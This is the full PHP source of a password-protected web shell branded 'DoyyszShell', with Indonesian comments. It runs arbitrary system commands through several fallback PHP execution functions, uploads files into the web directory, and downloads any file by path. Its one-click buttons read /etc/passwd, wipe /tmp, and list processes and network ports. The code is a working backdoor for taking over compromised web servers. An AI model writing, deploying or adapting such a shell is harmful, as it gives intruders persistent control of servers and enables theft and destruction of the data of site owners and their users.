<?php
/*
Minishell PHP - Voidsz_GPT Edition
Lightweight web-based shell dengan multi-engine
*/

// Password protection (ganti dengan password Anda)
$SHELL_PASSWORD = "voidsz123";
$SHELL_NAME = "DoyyszShell";

// Session authentication
session_start();
if(isset($_POST['password'])) {
    if($_POST['password'] === $SHELL_PASSWORD) {
        $_SESSION['authenticated'] = true;
        $_SESSION['auth_time'] = time();
    }
}

if(!isset($_SESSION['authenticated']) || (time() - $_SESSION['auth_time'] > 3600)) {
    // Show login form
    echo '<!DOCTYPE html>
    <html>
    <head>
        <title>'.$SHELL_NAME.' - Login</title>
        <style>
            body { background: #0a0a0a; color: #0f0; font-family: monospace; margin: 0; padding: 20px; }
            .login-box { 
                background: #111; 
                border: 1px solid #333; 
                padding: 30px; 
                width: 300px; 
                margin: 100px auto; 
                border-radius: 5px;
                box-shadow: 0 0 20px #000;
            }
            input[type="password"] { 
                width: 100%; 
                padding: 10px; 
                background: #222; 
                border: 1px solid #0a0; 
                color: #0f0; 
                margin: 10px 0;
                border-radius: 3px;
            }
            input[type="submit"] { 
                width: 100%; 
                padding: 10px; 
                background: #0a0; 
                border: none; 
                color: #000; 
                font-weight: bold; 
                cursor: pointer;
                border-radius: 3px;
            }
            .title { 
                text-align: center; 
                color: #f00; 
                margin-bottom: 20px;
                font-size: 20px;
                text-shadow: 0 0 10px #f00;
            }
        </style>
    </head>
    <body>
        <div class="login-box">
            <div class="title">'.$SHELL_NAME.'</div>
            <form method="POST">
                <input type="password" name="password" placeholder="Password" autofocus>
                <input type="submit" value="LOGIN">
            </form>
        </div>
    </body>
    </html>';
    exit;
}

// Function untuk execute commands dengan berbagai method
function executeCommand($cmd) {
    $output = '';
    
    // Method 1: system()
    if(function_exists('system')) {
        ob_start();
        system($cmd . ' 2>&1');
        $output = ob_get_contents();
        ob_end_clean();
        return $output;
    }
    
    // Method 2: shell_exec()
    if(function_exists('shell_exec')) {
        return shell_exec($cmd . ' 2>&1');
    }
    
    // Method 3: passthru()
    if(function_exists('passthru')) {
        ob_start();
        passthru($cmd . ' 2>&1', $retval);
        $output = ob_get_contents();
        ob_end_clean();
        return $output;
    }
    
    // Method 4: exec()
    if(function_exists('exec')) {
        exec($cmd . ' 2>&1', $output_arr, $retval);
        return implode("\n", $output_arr);
    }
    
    // Method 5: proc_open()
    if(function_exists('proc_open')) {
        $descriptorspec = array(
            0 => array("pipe", "r"),
            1 => array("pipe", "w"),
            2 => array("pipe", "w")
        );
        
        $process = proc_open($cmd, $descriptorspec, $pipes);
        
        if(is_resource($process)) {
            fclose($pipes[0]);
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            $error = stream_get_contents($pipes[2]);
            fclose($pipes[2]);
            proc_close($process);
            return $output . $error;
        }
    }
    
    // Method 6: popen()
    if(function_exists('popen')) {
        $handle = popen($cmd . ' 2>&1', 'r');
        $output = '';
        while(!feof($handle)) {
            $output .= fread($handle, 4096);
        }
        pclose($handle);
        return $output;
    }
    
    return "No execution method available";
}

// Function untuk upload file
function handleUpload() {
    if(isset($_FILES['file'])) {
        $target_dir = ".";
        $target_file = $target_dir . '/' . basename($_FILES['file']['name']);
        
        if(move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
            return "File uploaded successfully: " . htmlspecialchars(basename($_FILES['file']['name']));
        } else {
            return "Upload failed";
        }
    }
    return "";
}

// Function untuk download file
function handleDownload() {
    if(isset($_GET['download'])) {
        $file = $_GET['download'];
        if(file_exists($file)) {
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="'.basename($file).'"');
            header('Content-Length: ' . filesize($file));
            readfile($file);
            exit;
        }
    }
    return false;
}

// Function untuk file manager
function listFiles($dir = ".") {
    $files = scandir($dir);
    $result = "";
    
    foreach($files as $file) {
        if($file == "." || $file == "..") continue;
        
        $fullpath = $dir . '/' . $file;
        $perms = substr(sprintf('%o', fileperms($fullpath)), -4);
        $size = filesize($fullpath);
        $owner = function_exists('posix_getpwuid') ? posix_getpwuid(fileowner($fullpath))['name'] : '?';
        
        $result .= sprintf("%-12s %-10s %-8s %s\n", 
            $perms, 
            $owner, 
            formatSize($size), 
            $file
        );
    }
    
    return $result;
}

function formatSize($size) {
    $units = array('B', 'KB', 'MB', 'GB');
    $i = 0;
    while($size >= 1024 && $i < 3) {
        $size /= 1024;
        $i++;
    }
    return round($size, 2) . $units[$i];
}

// Handle actions
$output = "";
$current_dir = isset($_POST['dir']) ? $_POST['dir'] : ".";
$command = isset($_POST['cmd']) ? $_POST['cmd'] : "";

// Special commands
if(isset($_POST['action'])) {
    switch($_POST['action']) {
        case 'list':
            $output = listFiles($current_dir);
            break;
        case 'pwd':
            $output = getcwd();
            break;
        case 'whoami':
            $output = executeCommand("whoami");
            break;
        case 'uname':
            $output = executeCommand("uname -a");
            break;
        case 'phpinfo':
            ob_start();
            phpinfo();
            $output = ob_get_clean();
            break;
        case 'clear':
            // Just clear output
            $output = "";
            break;
        case 'sysinfo':
            $output = "System Info:\n";
            $output .= "PHP: " . phpversion() . "\n";
            $output .= "OS: " . php_uname() . "\n";
            $output .= "User: " . get_current_user() . "\n";
            $output .= "Memory: " . ini_get('memory_limit') . "\n";
            $output .= "Disabled Functions: " . ini_get('disable_functions') . "\n";
            break;
    }
}

// Execute custom command
if(!empty($command)) {
    // Built-in shell commands
    if(strpos($command, 'cd ') === 0) {
        $new_dir = trim(substr($command, 3));
        if(chdir($new_dir)) {
            $output = "Changed directory to: " . getcwd();
        } else {
            $output = "Failed to change directory";
        }
    } else {
        $output = executeCommand($command);
    }
}

// Handle upload
$upload_msg = handleUpload();

// CSS styling untuk shell
?>
<!DOCTYPE html>
<html>
<head>
    <title><?php echo $SHELL_NAME; ?></title>
    <meta charset="utf-8">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #0a0a0a;
            color: #0f0;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            line-height: 1.4;
            padding: 10px;
            overflow-x: hidden;
        }
        
        .header {
            background: linear-gradient(90deg, #111, #222);
            border-bottom: 2px solid #0a0;
            padding: 15px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-radius: 5px;
            box-shadow: 0 5px 15px rgba(0,255,0,0.1);
        }
        
        .header h1 {
            color: #f00;
            font-size: 24px;
            text-shadow: 0 0 10px #f00;
        }
        
        .status-bar {
            background: #111;
            border: 1px solid #333;
            padding: 10px;
            margin-bottom: 10px;
            border-radius: 3px;
            display: flex;
            flex-wrap: wrap;
            gap: 15px;
        }
        
        .status-item {
            color: #0af;
        }
        
        .status-item strong {
            color: #ff0;
        }
        
        .container {
            display: flex;
            gap: 20px;
            flex-wrap: wrap;
        }
        
        .panel {
            background: #111;
            border: 1px solid #333;
            border-radius: 5px;
            padding: 15px;
            flex: 1;
            min-width: 300px;
        }
        
        .panel-title {
            color: #f0f;
            border-bottom: 1px solid #333;
            padding-bottom: 5px;
            margin-bottom: 15px;
            font-size: 16px;
            font-weight: bold;
        }
        
        .quick-buttons {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
            gap: 10px;
            margin-bottom: 15px;
        }
        
        .btn {
            background: #222;
            border: 1px solid #444;
            color: #0f0;
            padding: 8px 12px;
            cursor: pointer;
            border-radius: 3px;
            text-align: center;
            transition: all 0.3s;
        }
        
        .btn:hover {
            background: #333;
            border-color: #0a0;
            transform: translateY(-2px);
        }
        
        .btn-danger {
            background: #300;
            border-color: #f00;
            color: #f00;
        }
        
        .btn-primary {
            background: #003;
            border-color: #00f;
            color: #00f;
        }
        
        textarea, input[type="text"], input[type="file"] {
            width: 100%;
            background: #000;
            border: 1px solid #0a0;
            color: #0f0;
            padding: 10px;
            margin-bottom: 10px;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
        }
        
        input[type="submit"] {
            background: #0a0;
            border: none;
            color: #000;
            padding: 10px 20px;
            cursor: pointer;
            border-radius: 3px;
            font-weight: bold;
            transition: all 0.3s;
        }
        
        input[type="submit"]:hover {
            background: #0f0;
            box-shadow: 0 0 10px #0f0;
        }
        
        .output {
            background: #000;
            border: 1px solid #333;
            padding: 15px;
            border-radius: 3px;
            max-height: 400px;
            overflow-y: auto;
            white-space: pre-wrap;
            word-wrap: break-word;
            margin-top: 15px;
        }
        
        .output pre {
            margin: 0;
        }
        
        .tab-container {
            margin-top: 20px;
        }
        
        .tabs {
            display: flex;
            border-bottom: 1px solid #333;
            margin-bottom: 15px;
        }
        
        .tab {
            padding: 10px 20px;
            cursor: pointer;
            border: 1px solid #333;
            border-bottom: none;
            border-radius: 5px 5px 0 0;
            background: #222;
        }
        
        .tab.active {
            background: #000;
            border-color: #0a0;
            color: #0f0;
        }
        
        .tab-content {
            display: none;
        }
        
        .tab-content.active {
            display: block;
        }
        
        .file-list {
            max-height: 300px;
            overflow-y: auto;
        }
        
        .file-item {
            padding: 5px;
            border-bottom: 1px solid #222;
            display: flex;
            justify-content: space-between;
        }
        
        .file-item:hover {
            background: #222;
        }
        
        .file-actions a {
            color: #0af;
            margin-left: 10px;
            text-decoration: none;
        }
        
        .file-actions a:hover {
            text-decoration: underline;
        }
        
        .logout {
            text-align: right;
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #333;
        }
        
        .logout a {
            color: #f00;
            text-decoration: none;
        }
        
        .logout a:hover {
            text-decoration: underline;
        }
        
        /* Responsive */
        @media (max-width: 768px) {
            .container {
                flex-direction: column;
            }
            
            .panel {
                min-width: 100%;
            }
        }
        
        /* Animasi */
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        .blink {
            animation: blink 1s infinite;
        }
        
        /* Scrollbar custom */
        ::-webkit-scrollbar {
            width: 10px;
        }
        
        ::-webkit-scrollbar-track {
            background: #111;
        }
        
        ::-webkit-scrollbar-thumb {
            background: #0a0;
            border-radius: 5px;
        }
        
        ::-webkit-scrollbar-thumb:hover {
            background: #0f0;
        }
    </style>
    <script>
        function switchTab(tabName) {
            // Hide all tab contents
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.classList.remove('active');
            });
            
            // Remove active class from all tabs
            document.querySelectorAll('.tab').forEach(tab => {
                tab.classList.remove('active');
            });
            
            // Show selected tab
            document.getElementById(tabName).classList.add('active');
            event.target.classList.add('active');
        }
        
        function quickCommand(cmd) {
            document.getElementById('command').value = cmd;
            document.getElementById('shell-form').submit();
        }
        
        function setCommand(cmd) {
            document.getElementById('command').value = cmd;
        }
        
        function clearOutput() {
            document.getElementById('output').innerHTML = '';
        }
        
        // Auto-focus command input
        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('command').focus();
        });
    </script>
</head>
<body>
    <div class="header">
        <h1 class="blink"><?php echo $SHELL_NAME; ?></h1>
        <div>
            <span style="color: #0ff;">[<?php echo htmlspecialchars(getcwd()); ?>]</span>
            <span style="color: #ff0; margin-left: 10px;">@<?php echo php_uname('n'); ?></span>
        </div>
    </div>
    
    <div class="status-bar">
        <div class="status-item"><strong>PHP:</strong> <?php echo phpversion(); ?></div>
        <div class="status-item"><strong>User:</strong> <?php echo get_current_user(); ?></div>
        <div class="status-item"><strong>OS:</strong> <?php echo php_uname('s'); ?></div>
        <div class="status-item"><strong>UID/GID:</strong> <?php echo getmyuid() . '/' . getmygid(); ?></div>
        <div class="status-item"><strong>Server:</strong> <?php echo $_SERVER['SERVER_SOFTWARE'] ?? 'N/A'; ?></div>
        <div class="status-item"><strong>Safe Mode:</strong> <?php echo ini_get('safe_mode') ? 'ON' : 'OFF'; ?></div>
    </div>
    
    <div class="container">
        <!-- Left Panel: Command Execution -->
        <div class="panel">
            <div class="panel-title">Command Execution</div>
            
            <form method="POST" id="shell-form">
                <textarea id="command" name="cmd" rows="4" placeholder="Enter command..."><?php echo htmlspecialchars($command); ?></textarea>
                
                <div class="quick-buttons">
                    <div class="btn" onclick="quickCommand('whoami')">whoami</div>
                    <div class="btn" onclick="quickCommand('uname -a')">uname</div>
                    <div class="btn" onclick="quickCommand('pwd')">pwd</div>
                    <div class="btn" onclick="quickCommand('ls -la')">ls -la</div>
                    <div class="btn" onclick="quickCommand('ps aux')">ps aux</div>
                    <div class="btn" onclick="quickCommand('netstat -tulpn')">netstat</div>
                    <div class="btn" onclick="quickCommand('id')">id</div>
                    <div class="btn" onclick="quickCommand('wget -h')">wget</div>
                    <div class="btn" onclick="quickCommand('curl -h')">curl</div>
                    <div class="btn" onclick="quickCommand('find / -type f -name "*.php" 2>/dev/null | head -20')">Find PHP</div>
                    <div class="btn" onclick="quickCommand('cat /etc/passwd')">/etc/passwd</div>
                    <div class="btn btn-danger" onclick="quickCommand('rm -f /tmp/*')">Clean /tmp</div>
                    <div class="btn btn-primary" onclick="clearOutput()">Clear Output</div>
                </div>
                
                <input type="submit" value="Execute">
                <input type="hidden" name="dir" value="<?php echo htmlspecialchars(getcwd()); ?>">
            </form>
            
            <!-- Output Area -->
            <div class="output" id="output">
                <pre><?php 
                if(!empty($upload_msg)) {
                    echo "Upload: " . $upload_msg . "\n\n";
                }
                echo htmlspecialchars($output); 
                ?></pre>
            </div>
        </div>
        
        <!-- Right Panel: Tools & Utilities -->
        <div class="panel">
            <div class="panel-title">Tools & Utilities</div>
            
            <div class="tab-container">
                <div class="tabs">
                    <div class="tab active" onclick="switchTab('file-manager')">File Manager</div>
                    <div class="tab" onclick="switchTab('upload')">Upload</div>
                    <div class="tab" onclick="switchTab('php-tools')">PHP Tools</div>
                    <div class="tab" onclick="switchTab('network')">Network</div>
                </div>
                
                <!-- File Manager Tab -->
                <div id="file-manager" class="tab-content active">
                    <form method="POST">
                        <input type="text" name="dir" value="<?php echo htmlspecialchars(getcwd()); ?>" placeholder="Directory path">
                        <input type="hidden" name="action" value="list">
                        <input type="submit" value="List Files">
                    </form>
                    
                    <div class="file-list">
                        <?php
                        $files = scandir('.');
                        foreach($files as $file) {
                            if($file == '.') continue;
                            $filepath = './' . $file;
                            $size = is_dir($filepath) ? 'DIR' : formatSize(filesize($filepath));
                            $perms = substr(sprintf('%o', fileperms($filepath)), -4);
                            $icon = is_dir($filepath) ? '📁' : '📄';
                            
                            echo '<div class="file-item">';
                            echo '<span>' . $icon . ' ' . htmlspecialchars($file) . '</span>';
                            echo '<span>' . $size . ' (' . $perms . ')</span>';
                            echo '<div class="file-actions">';
                            echo '<a href="?download=' . urlencode($file) . '">Download</a>';
                            if(!is_dir($filepath)) {
                                echo '<a href="#" onclick="setCommand(\'cat ' . htmlspecialchars($file) . '\')">View</a>';
                                echo '<a href="#" onclick="setCommand(\'rm ' . htmlspecialchars($file) . '\')">Delete</a>';
                            }
                            echo '</div>';
                            echo '</div>';
                        }
                        ?>
                    </div>
                </div>
                
                <!-- Upload Tab -->
                <div id="upload" class="tab-content">
                    <form method="POST" enctype="multipart/form-data">
                        <input type="file" name="file">
                        <input type="submit" value="Upload File">
                    </form>
                    
                    <div style="margin-top: 15px; color: #0af;">
                        <strong>Max upload size:</strong> <?php echo ini_get('upload_max_filesize'); ?><br>
                        <strong>Current dir:</strong> <?php echo htmlspecialchars(getcwd()); ?>
                    </div>
                </div>
                
                <!-- PHP Tools Tab -->
                <div id="php-tools" class="tab-content">
                    <form method="POST">
                        <input type="hidden" name="action" value="phpinfo">
                        <input type="submit" value="Show PHP Info">
                    </form>
                    
                    <form method="POST">
                        <input type="hidden" name="action" value="sysinfo">
                        <input type="submit" value="System Info">
                    </form>
                    
                    <div style="margin-top: 15px;">
                        <h4>PHP Functions Check:</h4>
                        <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 5px;">
                            <?php
                            $functions = ['system', 'shell_exec', 'exec', 'passthru', 'proc_open', 'popen'];
                            foreach($functions as $func) {
                                $color = function_exists($func) ? '#0f0' : '#f00';
                                echo '<div style="color:' . $color . ';">' . $func . '()</div>';
                            }
                            ?>
                        </div>
                    </div>
                </div>
                
                <!-- Network Tab -->
                <div id="network" class="tab-content">
                    <form method="POST">
                        <input type="hidden" name="cmd" value="ifconfig || ip addr">
                        <input type="submit" value="Network Interfaces">
                    </form>
                    
                    <form method="POST">
                        <input type="hidden" name="cmd" value="curl ifconfig.me">
                        <input type="submit" value="Public IP">
                    </form>
                    
                    <form method="POST">
                        <input type="text" name="cmd" placeholder="curl https://example.com">
                        <input type="submit" value="CURL Request">
                    </form>
                    
                    <form method="POST">
                        <input type="text" name="cmd" placeholder="ping -c 4 google.com">
                        <input type="submit" value="PING Test">
                    </form>
                </div>
            </div>
        </div>
    </div>
    
    <div class="logout">
        <a href="?logout=1">[Logout]</a> | 
        <a href="#" onclick="document.getElementById('command').value=''; document.getElementById('command').focus();">[Clear Command]</a> |
        <a href="#" onclick="clearOutput()">[Clear Output]</a>
    </div>
    
    <?php
    // Logout handler
    if(isset($_GET['logout'])) {
        session_destroy();
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    }
    ?>
</body>
</html>
